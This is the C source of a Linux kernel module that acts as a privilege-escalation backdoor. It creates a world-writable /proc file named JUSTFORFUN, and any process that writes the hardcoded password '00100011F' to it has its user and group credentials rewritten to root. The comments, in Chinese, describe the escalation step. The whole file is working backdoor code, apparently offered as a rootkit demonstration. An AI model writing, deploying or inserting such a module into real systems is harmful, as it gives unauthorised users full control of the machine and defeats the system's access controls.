#define DEBUG 1

#include <linux/fs.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
//copy_from_user
#include <linux/uaccess.h>
//__task_cred
#include <linux/cred.h>

#define NAME "JUSTFORFUN"
// create file in /proc/   with proc_create and proc_remove
struct proc_dir_entry *entry;


// 声明写处理函数并放入结构体
ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp);

struct file_operations proc_fops = {
    .write = write_handler
};

// 定义写处理函数
#define AUTH "00100011F"
ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp)
{
    char *kbuff;
    struct cred* cred;

    // 分配内存。
    kbuff = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuff) {
        return -ENOMEM;
    }

    // 复制到内核缓冲区。
    if (copy_from_user(kbuff, buff, count)) {
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = (char)0;

    if (strlen(kbuff) == strlen(AUTH) &&
        strncmp(AUTH, kbuff, count) == 0) {

        // 用户进程写入的内容是我们的口令或者密码，
        // 把进程的 ``uid`` 与 ``gid`` 等等
        // 都设置成 ``root`` 账号的，将其提权到 ``root``。
        printk("%s\n", "Comrade, I will help you.");
        cred = (struct cred *)__task_cred(current);
        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        printk("%s\n", "See you!");
    } else {
        // 密码错误，拒绝提权。
        printk("Alien, get out of here: %s.\n", kbuff);
    }

    kfree(kbuff);
    return count;
}


//Module init and exit
static int __init give_me_root_init(void)
{
	entry = proc_create(NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);
	return 0;
}

static void __exit give_me_root_exit(void)
{
	proc_remove(entry);	
}


module_init(give_me_root_init);
module_exit(give_me_root_exit);


